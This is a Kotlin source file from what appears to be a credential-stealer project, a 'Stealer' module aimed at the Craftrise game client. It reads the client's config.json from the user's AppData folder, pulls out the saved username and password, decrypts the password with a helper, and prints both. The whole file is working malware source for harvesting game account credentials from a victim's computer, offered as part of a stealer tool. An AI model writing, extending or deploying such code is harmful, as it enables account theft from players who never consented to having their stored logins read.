package io.groax.impl.stealer

import com.google.common.base.Objects
import com.google.gson.JsonObject
import io.groax.api.stealer.Stealer
import io.groax.impl.Utilities
import org.apache.commons.io.FileUtils
import java.io.File

/**
 * @author Groax
 */
class Craftrise : Stealer
{
    //We need parse first.
    override var encryptedLocation: File = File(System.getenv("appdata"), ".craftrise" + File.separator + "config.json")

    override var encryptedJson: JsonObject = parser.parse(FileUtils.readFileToString(encryptedLocation, "UTF-8")).asJsonObject


    override fun getPassword(): String {
        return Utilities.decryptRaccoon(encryptedJson.get("rememberPass").asString)
    }

    override fun getUsername(): String {
        return encryptedJson.get("rememberName").asString
    }

    override fun toString(): String {
        return Objects.toStringHelper(this).add("Username", this.getUsername()).add("Password", this.getPassword()).toString()
    }
}